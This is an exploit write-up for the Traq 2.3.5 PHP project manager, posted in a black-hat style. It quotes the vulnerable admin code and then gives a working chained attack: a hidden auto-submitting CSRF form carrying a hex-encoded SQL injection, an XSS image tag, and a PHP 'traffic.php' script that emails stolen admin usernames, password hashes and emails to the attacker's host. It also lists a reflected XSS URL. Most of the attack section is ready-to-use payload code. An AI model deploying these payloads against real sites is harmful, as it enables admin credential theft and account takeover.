@@ -1,0 +1,222 @@
+====================================================================
+Vulnerable Software: traq-2.3.5
+Official Site: TraqProject.org
+====================================================================
+About Software:
+Traq is a PHP powered project manager, capable of tracking issues for multiple projects 
+with multiple milestones.
+====================================================================
+Tested on:
+*php.ini MAGIC_QUOTES_GPC OFF*
+Safe mode off
+/*
+OS: Windows XP SP2 (32 bit)
+Apache: 2.2.21.0
+PHP Version: 5.2.17.17
+MYSQL:  5.5.25
+*/
+
+====================================================================
+Vuln Desc:
+traq-2.3.5 is prone to: CSRF,XSS,SQL injection vulns.
+
+
+[+] LESSON NUMBER 1:VULN IS VULN. IT DOESN'T MATTER WHERE IT EXISTS.
+====================================================================
+I noticed many developers,coders,admins,webmaster always thinks:
+"If you find vuln(s) in administration section you can't exploit it.
+You need to login to administration section to exploit it.Bla bla bla."
+=======I HOPE THIS will be LESSON FOR ALL WHO THINKS LIKE BOTTOM=========
+
+Vulnerable code section:
+//admincp/groups.php
+====================================================================
+  // Create
+  if(@$_POST['action'] == 'create')
+  {
+    // Check for errors
+    if(empty($_POST['values']['name']))
+      $errors['name'] = l('error_name_empty');
+      
+    if(!count($errors))
+    {
+      // Sort columns from values
+      $keys = array();
+      $values = array();
+      foreach($_POST['values'] as $key => $val)
+      {
+        $keys[] = $key;
+        $values[] = "'".$val."'";
+      }
+      
+      $db->query("INSERT INTO ".DBPF."usergroups (".implode(',',$keys).") VALUES(".implode(',',$values).")");
+      
+      header("Location: groups.php?created");
+    }
+    
+    $group = $_POST['values'];
+  }
+  
+  // Save Usergroup
+  if(@$_POST['action'] == 'save')
+  {
+    // Check for errors
+    if(empty($_POST['values']['name']))
+      $errors['name'] = l('error_name_empty');
+      
+    if(!count($errors))
+    {
+      // Make the query.
+      $query = array();
+      foreach($_POST['values'] as $key => $val)
+        $query[] = $key."='".$val."'";
+      
+      // Run the query.
+      $db->query("UPDATE ".DBPF."usergroups SET ".implode(', ',$query)." WHERE id='".$db->res($_REQUEST['edit'])."' LIMIT 1");
+      
+      header("Location: groups.php?saved");
+    }
+  }
+
+====================================================================
+
+
+We'll exploit 3 vulns together:
+CSRF+SQL INJECTION+XSS
+As result we will steal admin credentials(login:password:email) from database.
+Payload:
+
+mysql> select 0x41646D696E6973747261746F72733C2F613E3C696D67207372633D22687474703A2F2F3139322E3136382E302E31352F6C6561726E2F747261
+666669632E7068703F67657470776E65643D \G
+*************************** 1. row ***************************
+0x41646D696E6973747261746F72733C2F613E3C696D67207372633D22687474703A2F2F3139322E3136382E302E31352F6C6561726E2F747261666669632E7068
+703F67657470776E65643D: Administrators</a><img src="http://192.168.0.15/learn/traffic.php?getpwned=
+1 row in set (0.00 sec)
+
+mysql> select 0x22206865696774683D302077696474683D30202F3E \G
+*************************** 1. row ***************************
+0x22206865696774683D302077696474683D30202F3E: " heigth=0 width=0 />
+1 row in set (0.00 sec)
+
+
+//Our "Cookie Stealer" (In this case it is our credentials stealer *aka snifer*)
+//traffic.php
+==================BEGIN TRAFFIC.PHP===============
+<?php
+error_reporting(0);
+if (isset($_GET['getpwned']))
+{
+$nastycookies=htmlentities(str_ireplace('\'','',$_GET['getpwned']));//some bugfixes to get rid single quote xD//
+$sendto='noscriptkidding_please_IT_IS_ONLY_FOR_EDUCATIONAL_PURPOSES@mustdiehacker';//your mail address.
+@mail($sendto,'Your nAsty cookies',PHP_EOL .$nastycookies);//sending mail to you//
+}
+?>
+================ EOF TRAFFIC.HTML=================
+
+
+================ EOF PAGE1.HTML================
+<!DOCTYPE HTML>
+<html>
+<head>
+<title></title>
+
+<style type="text/css">
+body
+{
+background-color:black;
+color:red;
+}
+img
+{
+position:absolute;
+top:20px;
+}
+
+iframe
+{
+position:absolute;
+background-color:black;
+color:black;
+visibility:hidden;
+}
+</style>
+</head>
+<body>
+
+<img src="#" /><br>
+
+
+<iframe src="CSRF_SQL_INJ_XSS_TRAQ.html" />
+</body>
+</html>
+================ EOF PAGE1.HTML================
+
+
+
+
+============BEGIN CSRF_SQL_INJ_XSS_TRAQ.html====================
+
+<body onload="javascript:document.forms[0].submit()">
+<form name="pwn" action="http://====>CHANGE HERE<======/admincp/groups.php?edit=1" method="post">
+<input type="hidden" name="action" value="save" />
+<input type="text" name="values[name]" value="1',name=(select concat(0x41646D696E6973747261746F72733C2F613E3C696D67207372633D22687474703A2F2F3139322E3136382E302E31352F6C6561726E2F747261666669632E7068703F67657470776E65643D,username,0x7c,password,0x7c,email,0x22206865696774683D302077696474683D30202F3E) from traq_users where group_id=1),is_admin='1" />
+<input type="radio" name="values[is_admin]" value="1" id="is_admin_yes" checked="checked" />
+<input type="radio" name="values[is_admin]" value="0" id="is_admin_no" />
+<input type="radio" name="values[create_tickets]" value="1" id="create_tickets_yes" />
+<input type="radio" name="values[create_tickets]" value="0" id="create_tickets_no" checked="checked" />
+<input type="radio" name="values[update_tickets]" value="1" id="update_tickets_yes" />
+<input type="radio" name="values[update_tickets]" value="0" id="update_tickets_no" checked="checked" />
+<input type="radio" name="values[comment_tickets]" value="1" id="comment_tickets_yes" />
+<input type="radio" name="values[comment_tickets]" value="0" id="comment_tickets_no" checked="checked" />
+<input type="radio" name="values[delete_tickets]" value="1" id="delete_tickets_yes" />
+<input type="radio" name="values[delete_tickets]" value="0" id="delete_tickets_no" checked="checked" />
+<input type="radio" name="values[add_attachments]" value="1" id="add_attachments_yes" />
+<input type="radio" name="values[add_attachments]" value="0" id="add_attachments_no" checked="checked" />
+</form>
+============EOF CSRF_SQL_INJ_XSS_TRAQ.html====================
+
+
+If your attack was successfull against victim you will receive admin credentials like below:
+
+
+admin|d033e22ae348aeb5660fc2140aec35850c4da997|admin@localhost.tld
+
+@Print screen successfull attack result (@mail'ed credentials to attacker)
+
+http://s018.radikal.ru/i516/1206/14/85c6beab9a42.png
+
+
+
+
+XSS via $_GET:
+http://192.168.0.15/learn/traq/upload/admincp/plugins.php?edit&plugin=1"/><script>alert(1);</script>
+
+
+[+] LESSON NUMBER 2: Do not trust to client side.Sanitize and validate it.
+
+
+
+=====================THE END=================================
+
+
+
++++++++++My Special thanks to:+++++++++++++++++++++
+packetstormsecurity.org
+packetstormsecurity.com
+packetstormsecurity.net
+securityfocus.com
+cxsecurity.com
+security.nnov.ru
+securtiyvulns.com
+securitylab.ru
+1337day.com
+secunia.com
+securityhome.eu
+exploitsdownload.com
+to all AA Team + to all Azerbaijan Black HatZ + 
+           *Especially to my bro CAMOUFL4G3.*
+++++++++++++++++++++++++++++++++++++++++++++++++
+
+Respect && Thank you.
+
+/AkaStep ^_^
